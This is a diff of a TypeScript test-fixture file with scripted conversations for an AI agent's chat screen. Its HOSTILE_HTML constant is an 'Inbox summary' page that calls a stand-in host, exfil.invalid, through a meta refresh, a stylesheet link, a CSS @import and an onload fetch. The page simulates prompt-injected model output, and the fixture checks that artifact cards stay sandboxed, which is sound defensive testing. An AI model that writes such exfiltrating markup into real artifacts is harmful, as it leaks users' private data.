@@ -1,10 +1,6 @@
 import { crc32, deflateSync } from "node:zlib"
 import type { RunnerMessage, RunnerSnapshot } from "@openwork-ee/headless-protocol"
 
-/**
- * Test-only conversations for chat-screen-server.ts, in the shape `GET /v1/workbot` answers. Each scenario is a
- * function so every server start begins from the same conversation.
- */
 type Part = { kind: "text"; text: string; step?: number } | { kind: "steps"; steps: unknown[] }
 export type FixtureTurn = {
   id: string
@@ -20,6 +16,7 @@ export type FixtureTurn = {
   greeting?: boolean
   retryable?: boolean
   outputs?: Array<{ id: string; name: string; mediaType: string; size: number; updatedAt?: number }>
+  teaching?: { id: string }
 }
 export type FixtureThread = { name: string; organizationName: string; status: "idle" | "busy"; turns: FixtureTurn[]; hasEarlier: boolean; filesEnabled: boolean }
 
@@ -44,17 +41,14 @@ export const scenarios: Record<string, () => FixtureThread> = {
       ],
     })],
   }),
-  /** Accepted, deliberately slow first token: the acknowledgement must not depend on a model response. */
   waiting: () => ({ name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
     turns: [hello(), working(turn("w1", "Use the browser to open YouTube", Date.now(), [], { modelSteps: 0 }))],
   }),
-  /** Hours-old stopped job must never hold the header or offer Stop. */
   stopped: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [hello(), turn("s1", "Build a 3D room planner", ago(13_000), [said("I stopped the room planner.")], {
       tasks: [{ id: "s1.t1", title: "3D room planner", status: "stopped", startedAt: ago(13_000), finishedAt: ago(12_000), update: null, updates: [], steps: [], stepsDone: 0, note: null }],
     })],
   }),
-  /** #6: Workbot searching YouTube in its browser, without showing its screen. */
   browsing: () => ({
     name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
     turns: [
@@ -65,7 +59,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
       ], { modelSteps: 2 })),
     ],
   }),
-  /** Work on the rest of Workbot's computer (not its browser): a finished Computer card, then one still working. */
   "computer-use": () => ({
     name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
     turns: [
@@ -80,7 +73,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
       ], { modelSteps: 2 })),
     ],
   }),
-  /** Deterministic running task for preview ownership/control proofs; no external identity. */
   "browser-lifecycle": () => ({
     name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
     turns: [hello(), working(turn("browser_live", "Open the project page in your browser", ago(10), [
@@ -88,7 +80,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
       { kind: "steps", steps: [computerStep(["Opening the project page"], true, ago(5), { surface: "browser" })] },
     ], { modelSteps: 2 }))],
   }),
-  /** #9 and #10: a background task building an app, then a quick command on the computer. */
   task: () => ({
     name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
     turns: [
@@ -102,7 +93,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
       ], { modelSteps: 1 })),
     ],
   }),
-  /** Nov 8: "Could you go on google.com with browser", as the conversation is read once it is done (see googleAt). */
   google: () => googleAt(2),
   exa: () => exaAt(3),
   openwork: () => openworkAt(false),
@@ -114,7 +104,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
       { kind: "steps", steps: ["Exa", "Exa", "Google Drive", "Linear", "Slack", "GitHub", "PlanetScale", "Research"].map((app) => ({ ...appStep(`Checking ${app}`, app, false, ago(20)), detail: "Read notes" })) },
     ])],
   }),
-  /** Files Workbot made: an interactive app (a live thumbnail), then a report and a spreadsheet (placeholders by type). */
   artifacts: () => ({
     name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [
@@ -127,25 +116,18 @@ export const scenarios: Record<string, () => FixtureThread> = {
       }),
     ],
   }),
-  /** An artifact built in OpenWork and an HTML file in the same reply. */
   "openwork-app": () => ({
     name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [hello(), turn("o1", "Create a simple hello world artifact", minutesAgo(2), [said("Hello World Wave is ready. Open the artifact from the card below.")], { outputs: [OPENWORK_APP, ARTIFACT_FILES.organizer] })],
   }),
-  /** A tall phone screenshot Workbot sends back: its card and preview keep the picture's proportions. */
   photo: () => ({
     name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [hello(), turn("p1", "Send me the screenshot of the phone app", minutesAgo(1), [said("Here it is, straight from the phone build.")], { outputs: [ARTIFACT_FILES.photo] })],
   }),
-  /** An app that tries to reach the network and navigate by itself: its card must do neither until it is opened. */
   "artifact-hostile": () => ({
     name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [hello(), turn("h1", "Summarize my inbox as a page", minutesAgo(2), [said("Here's the summary page.")], { outputs: [ARTIFACT_FILES.hostile] })],
   }),
-  /**
-   * ENG-1143, production Nov 9: nothing running, and background tasks that each polled a remote task many times (the
-   * same "Checking the remote task" step over and over), two of them gone quiet. Each must stay one row.
-   */
   background: () => {
     const polls = (count: number, firstAgo: number, gap: number) => Array.from({ length: count }, (_, index) => ({ label: "Checking the remote task", done: true, at: ago(firstAgo - index * gap) }))
     const task = (id: string, title: string, status: string, startedAgo: number, steps: Array<{ label: string; done: boolean; at: number }>, finishedAgo: number | null = null) =>
@@ -161,10 +143,7 @@ export const scenarios: Record<string, () => FixtureThread> = {
       })],
     }
   },
-  /** Short and long messages from the person (#1, #2): "Hey" must stay on one line. */
-  /** A conversation with nothing in it yet: the first-open screen. */
   empty: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true, turns: [] }),
-  /** A turn that failed: the error line under the request, with Try again. */
   failed: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [
       hello(),
@@ -172,7 +151,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
       turn("f1", "Move the planning review to Thursday", minutesAgo(2), [], { status: "failed", modelSteps: 0, retryable: true, error: "Workbot could not finish this. Try again in a moment." }),
     ],
   }),
-  /** Long messages both ways: wrapping, lists and paragraphs in the narrow column. */
   long: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
     turns: [
       hello(),
@@ -196,10 +174,6 @@ export const scenarios: Record<string, () => FixtureThread> = {
   }),
 }
 
-/**
- * Ben's request of Nov 8 at each point the page reads it: 0, the call is being written and nothing is stored yet (the
- * live `working` events in GOOGLE_EVENTS are all the page has); 1, the browser call is stored and running; 2, done.
- */
 export function googleAt(phase: 0 | 1 | 2): FixtureThread {
   const sent = Date.now() - 6_000
   const step = computerStep(["Opening google.com"], phase === 1, sent + 1_000, { surface: "browser", pages: [{ id: "g00gle", url: "https://www.google.com/", title: "google.com" }] })
@@ -208,11 +182,6 @@ export function googleAt(phase: 0 | 1 | 2): FixtureThread {
   return { name: "Workbot", organizationName: "Example Team", status: phase === 2 ? "idle" : "busy", hasEarlier: false, filesEnabled: true, turns: [hello(), phase === 2 ? asked : working(asked)] }
 }
 
-/**
- * Ben's request of Nov 8 at 7:33 ("could you use exa to search about best ux practices and skills"), in the shape
- * workbot-server builds from the runner's transcript for `mcp:<connection>:web_search_exa` calls: 0, the first search
- * is running; 1, the second; 2, both done while Workbot reads the results; 3, answered (also what a reload reads).
- */
 export function exaAt(phase: 0 | 1 | 2 | 3): FixtureThread {
   const sent = Date.now() - 12_000
   const search = (running: boolean, at: number) => ({ ...appStep("Searching Exa", "Exa", running, at), detail: "Web search", site: "exa.ai" })
@@ -223,12 +192,6 @@ export function exaAt(phase: 0 | 1 | 2 | 3): FixtureThread {
   return { name: "Workbot", organizationName: "Example Team", status: phase === 3 ? "idle" : "busy", hasEarlier: false, filesEnabled: true, turns: [hello(), phase === 3 ? asked : working(asked)] }
 }
 
-/**
- * One answer that used connectors and OpenWork's own features, as the runner stores it: Exa, Google Drive, Linear,
- * then a skill, a plugin Workflow, an Automation, a background task and a remote task on the person's Mac Studio.
- * `live` leaves the remote task running. connector-steps.test.ts checks openworkAt against workbot-server's real
- * buildWorkbotTurns of this transcript (the fixture server runs without the development build of workbot-server).
- */
 export function openworkSnapshot(live: boolean, sent: number): RunnerSnapshot {
   const id = "wb_ow1"
   const messages: RunnerMessage[] = [{ messageId: id, role: "user", text: OPENWORK_REQUEST }]
@@ -256,7 +219,6 @@ const OPENWORK_CALLS: Array<[string, string, Record<string, unknown>]> = [
   ["c7", "start_task", { title: "Draft the weekly digest", brief: "…" }],
   ["c8", "execute_capability", { name: "remote-session:create", body: { target: "mac-studio" } }],
 ]
-/** The steps workbot-server builds from OPENWORK_CALLS, in order (checked by connector-steps.test.ts). */
 const OPENWORK_STEPS: Array<Record<string, unknown>> = [
   { label: "Searching Exa", app: "Exa", detail: "Web search", site: "exa.ai" },
   { label: "Searching Google Drive", app: "Google Drive", detail: "Search drive files" },
@@ -268,7 +230,6 @@ const OPENWORK_STEPS: Array<Record<string, unknown>> = [
   { label: "Starting a remote task", app: "OpenWork", detail: "Remote task", site: "openworklabs.com", openwork: true, remote: true },
 ]
 
-/** The page's view of openworkSnapshot: (Exa)(Google Drive)(Linear)(OpenWork), one OpenWork logo for all its features. */
 export function openworkAt(live: boolean, sent = Date.now() - 30_000): FixtureThread {
   const parts: Part[] = []
   OPENWORK_STEPS.forEach((step, index) => {
@@ -285,14 +246,12 @@ export function openworkAt(live: boolean, sent = Date.now() - 30_000): FixtureTh
   return { name: "Workbot", organizationName: "Example Team", status: live ? "busy" : "idle", hasEarlier: false, filesEnabled: true, turns: [hello(), live ? working(asked) : asked] }
 }
 
-/** What the page hears while the call is written, as workbot-server sends it: the start, then where, then what. */
 export const GOOGLE_EVENTS = [
   { type: "working", messageId: "g1", step: 0, on: "computer" },
   { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser" },
   { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser", update: "Opening google.com" },
 ]
 
-/** A small interactive app, as Workbot writes one: its <title> names the card. */
 const ORGANIZER_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>3D Space Organizer</title>
 <style>
 body{margin:0;font:13px/1.4 system-ui,sans-serif;background:linear-gradient(180deg,#eef3f8,#dfe8f1);color:#11181c;height:100vh;display:flex}
@@ -312,7 +271,6 @@ i{width:10px;height:10px;border-radius:3px;display:inline-block}ul{list-style:no
 for(const b of document.querySelectorAll(".box"))b.onpointerdown=e=>{b.setPointerCapture(e.pointerId);const sx=e.clientX,sy=e.clientY,ox=b.offsetLeft,oy=b.offsetTop;b.onpointermove=m=>{b.style.left=ox+(m.clientX-sx)+"px";b.style.top=oy+(m.clientY-sy)+"px"};b.onpointerup=()=>{b.onpointermove=null}}
 </script></body></html>`
 
-/** Model-written HTML that tries to send what it holds elsewhere the moment it renders (prompt injection). */
 const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><meta http-equiv="refresh" content="0;url=http://exfil.invalid/refresh?d=secret">
 <link rel="stylesheet" href="http://exfil.invalid/style.css"><style>@import url(http://exfil.invalid/import.css);body{font:14px system-ui;padding:24px}</style></head>
 <body onload="fetch('http://exfil.invalid/onload?d=secret')"><h1>Inbox summary</h1><p>Three threads need a reply today: the vendor invoice, the offsite plan and the hiring loop.</p>
@@ -321,10 +279,6 @@ const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><me
 
 const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),Furniture store,49\nStorage bins x4,Home store,36\nDesk lamp,Lighting shop,29\nPlant stand,Furniture store,19\n"
 
-/**
- * A tall phone screenshot (390 × 844 at 2x) as a PNG: a status bar, a notification card and rows. Its preview must keep
- * these proportions inside the panel instead of rendering at its own size.
- */
 function phoneScreenshot(): Buffer {
   const width = 390, height = 844
   const rows: Buffer[] = []
@@ -350,7 +304,6 @@ function phoneScreenshot(): Buffer {
 }
 const PHONE_PNG = phoneScreenshot()
 
-/** Bytes for the files the "artifacts" scenario made, served at /v1/workbot/files/:id. */
 export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string | Buffer }> = {
   "out-photo": { mediaType: "image/png", bytes: PHONE_PNG },
   "out-organizer": { mediaType: "text/html", bytes: ORGANIZER_HTML },
@@ -358,13 +311,8 @@ export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string |
   "out-report": { mediaType: "application/pdf", bytes: "%PDF-1.4\n% fixture\n" },
   "out-shopping": { mediaType: "text/csv", bytes: SHOPPING_CSV },
 }
-/** An App built in OpenWork as a reply lists it: no bytes, its title as its name. */
 export const OPENWORK_APP_ID = "cob_01kq8z0000000000000000000a"
 const OPENWORK_APP = { id: `app:${OPENWORK_APP_ID}`, name: "Hello World Wave", mediaType: "application/vnd.openwork.app", size: 0, updatedAt: 1 }
-/**
- * What opening that App answers: a page that speaks the MCP Apps protocol to its host (initialize, then the opening
- * result), and calls its own `wave` tool from a button.
- */
 export const OPENWORK_APP_OPENED = {
   result: { content: [{ type: "text", text: "Hello World Wave" }], structuredContent: { app: { appId: OPENWORK_APP_ID, title: "Hello World Wave" }, greeting: "Hello, World!" } },
   html: `<!doctype html><html><head><meta charset="utf-8"><title>Hello World Wave</title><style>
